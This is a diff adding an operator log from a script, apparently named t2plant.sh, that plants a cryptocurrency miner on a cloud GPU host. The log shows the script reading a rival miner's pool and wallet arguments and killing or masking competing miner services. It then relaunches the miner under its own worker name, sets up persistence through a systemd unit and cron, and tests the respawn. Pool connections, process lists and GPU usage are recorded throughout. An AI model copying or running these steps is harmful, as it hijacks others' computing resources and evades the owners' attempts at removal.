@@ -1,0 +1,121 @@
+/tmp/t2plant.sh: line 6: /opt/ul-t2/wallet: Permission denied
+== t2plant 20261125T080948Z host=t19-l40s1-eude2-canon uid=1000
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),118(netdev),119(lxd)
+t19-l40s1-eude2-canon
+x86_64
+-- gpu before
+GPU 0: NVIDIA L40S (UUID: GPU-a654bff2-9f5c-67aa-821e-e511170e48f3)
+0, NVIDIA L40S, 46068 MiB, 2052 MiB, 100 %
+crw-rw-rw- 1 root root 195, 254 Nov 22 22:26 /dev/nvidia-modeset
+crw-rw-rw- 1 root root 234,   0 Nov 22 22:26 /dev/nvidia-uvm
+crw-rw-rw- 1 root root 234,   1 Nov 22 22:26 /dev/nvidia-uvm-tools
+crw-rw-rw- 1 root root 195,   0 Nov 22 22:26 /dev/nvidia0
+crw-rw-rw- 1 root root 195, 255 Nov 22 22:26 /dev/nvidiactl
+
+/dev/nvidia-caps:
+total 0
+cr-------- 1 root root 237, 1 Nov 22 22:27 nvidia-cap1
+cr--r--r-- 1 root root 237, 2 Nov 22 22:27 nvidia-cap2
+-- competitor peakminer argv
+pm_pid=2568958
+/opt/nv/peakminer
+-d
+0
+-o
+stratum+ssl://prl-sg.kryptex.network:8048
+-o
+stratum+tcp://prl-sg.kryptex.network:7048
+-o
+stratum+ssl://prl-eu.kryptex.network:8048
+-o
+stratum+ssl://prl-us.kryptex.network:8048
+-o
+stratum+ssl://prl-hk.kryptex.network:8048
+-o
+stratum+ssl://prl-ae.kryptex.network:8048
+-u
+prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-t19-149-81-10-242-g0
+-p
+x
+-c
+pearl
+-- units
+# Unit nv-cuda-cache@0.service is masked.
+# Unit supervisor.service is masked.
+[Unit]
+Description=nv pearl supervisor
+ExecStart=/opt/nv/supervisor.sh
+Restart=always
+RestartSec=30
+-- backup
+cron_20261125T080948Z.txt
+nv-cuda-cache.service
+nv-cuda-cache@.service
+nv-cuda-cache@0.service
+nv-cuda-cache@g0.service
+nv-t19.service
+nv-t19v.service
+pm_argv_20261125T080948Z.txt
+ps_20261125T080948Z.txt
+-- stop competitors
+Unit /etc/systemd/system/supervisor.service is masked, ignoring.
+Unit /etc/systemd/system/nv-cuda-cache@0.service is masked, ignoring.
+Unit /etc/systemd/system/nv-cuda-cache.service is masked, ignoring.
+Failed to mask unit: File /etc/systemd/system/nv-t19.service already exists.
+/tmp/t2plant.sh: line 23: 2570756 Killed                  $S pkill -9 -f '/opt/nv/peakminer'
+/tmp/t2plant.sh: line 23: 2570758 Killed                  $S pkill -9 -f '/opt/ul-t2/krig-miner'
+/tmp/t2plant.sh: line 23: 2570760 Killed                  $S pkill -9 -f 'wildrig-multi'
+-- procs after kill
+-- build our argv from competitor argv
+ARGV=/opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqsur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-t2-ps-149-81-10-242-g0 -p x -c pearl
+#!/bin/bash
+exec /opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqsur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-t2-ps-149-81-10-242-g0 -p x -c pearl
+-- unit
+Created symlink /etc/systemd/system/multi-user.target.wants/ul-t2-ps0.service → /etc/systemd/system/ul-t2-ps0.service.
+-- keep.sh
+*/2 * * * * /home/ubuntu/ul2/poll.sh
+@reboot /opt/ul-t2/keep.sh
+*/5 * * * * /opt/ul-t2/keep.sh
+-- log
+
+ ____            _    __  __ _
+|  _ \ ___  __ _| | _|  \/  (_)_ __   ___ _ __
+| |_) / _ \/ _` | |/ / |\/| | | '_ \ / _ \ '__|
+|  __/  __/ (_| |   <| |  | | | | | |  __/ |
+|_|   \___|\__,_|_|\_\_|  |_|_|_| |_|\___|_|
+# high-performance GPU miner · v2.20.8
+Need help or have questions? Join our community for fast support:
+  Discord:   https://peakminer.org/join-our-discord
+  Telegram:  https://peakminer.org/join-our-telegram
+(c) 2026 PeakMiner — proprietary, all rights reserved; no reverse engineering / redistribution (see LICENSE). build=20261111-88e594
+[2m2026-11-25 08:09:57[0m [32m INFO[0m peakminer/2.20.8 — coin=pearl wallet=prl1pek8rh8yjck5q7596aph7ua7xnkqsur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-t2-ps-149-81-10-242-g0 worker= devices=1 legacy_auth
+[2m2026-11-25 08:09:57[0m [32m INFO[0m API listening on http://127.0.0.1:4068/summary
+[peakminer] kernel attestation: peakminer pearl GPU kernel | (c) peakminer | Proprietary software. Unauthorized use, copying, or redistribution prohibited. | https://peakminer.org | contact=dev@peakmi
+[2m2026-11-25 08:09:57[0m [31mERROR[0m authorize failed: connection closed
+[2m2026-11-25 08:09:58[0m [31mERROR[0m authorize failed: connection closed
+[2m2026-11-25 08:09:58[0m [31mERROR[0m authorize failed: connection closed
+[2m2026-11-25 08:10:02[0m [31mERROR[0m authorize failed: connection closed
+[2m2026-11-25 08:10:10[0m [31mERROR[0m authorize failed: connection closed
+[2m2026-11-25 08:10:27[0m [31mERROR[0m authorize failed: connection closed
+-- procs
+2570842 /opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqsur9mkfmz8w7xfzcdfc
+2570857 /opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqsur9mkfmz8w7xfzcdfc
+-- pool
+try0 
+try1 
+try2 
+try3 
+try4 
+try5 
+try6 
+try7 
+POOL_PROOF_OK=0
+-- respawn test
+/tmp/t2plant.sh: line 82: 2571444 Killed                  $S pkill -9 -f 'ul-t2-ps-149-81-10-242-g0'
+RESPAWN_SECONDS=35
+active
+Restart=always RestartUSec=30s 
+-- gpu after
+0, NVIDIA L40S, 2052 MiB, 100 %, 250.20 W
+-- final pool
+done
